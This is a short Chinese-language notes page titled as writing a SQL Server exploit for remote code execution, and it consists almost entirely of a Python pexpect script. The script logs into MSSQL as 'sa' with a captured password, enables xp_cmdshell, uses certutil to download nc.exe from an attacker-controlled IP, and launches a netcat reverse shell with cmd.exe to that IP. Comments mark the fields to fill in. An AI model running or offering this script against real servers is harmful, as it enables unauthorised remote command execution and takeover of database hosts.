---
description: Python / Microsoft SQL Server
---

# ✔️ 编写 SQL Server 漏洞利用程序进行 RCE

## 脚本

```python
// Some code
import pexpect
import time

def enable_cmdshell():
    child.sendline("sp_configure 'show advanced options', '1'")
    print("Enabling xp_cmdshell")
    child.expect(confirmation)
    child.sendline("RECONFIGURE")
    child.sendline("sp_configure 'xp_cmdshell','1'")
    child.expect(confirmation)
    child.sendline("RECONFIGURE")
    spawn_shell()

def spawn_shell():
    print("Upload netcat binary...")
    child.sendline("EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://192.169.xx.xxx/nc.exe C:/users/public/nc.exe'")      # 要修改
    time.sleep(5)
    print("Spawning shell...")
    child.sendline("EXEC master..xp_cmdshell 'C:/users/public/nc.exe 192.168.xx.xxx 443 -e cmd.exe'")     # 要修改
    time.sleep(5)
    print("Closing...")
    child.close()

def connect():
    print("Connecting to remote MSSQL DB...")
    child.expect(pass_prompt)
    child.sendline('已获取到的密码')        # 要修改
    print("Logging in...")
    child.expect(sql_prompt)
    print("Success!")



if __name__ == '__main__':
    sql_prompt = "SQL>"
    confirmation = "to install\."
    pass_prompt = "Password:"
    command = "impacket-mssqlclient sa@192.168.xx.xxx"   # 要修改
    child = pexpect.spawn(command)
    connect()
    enable_cmdshell()
    spawn_shell()

```

## MEMO.





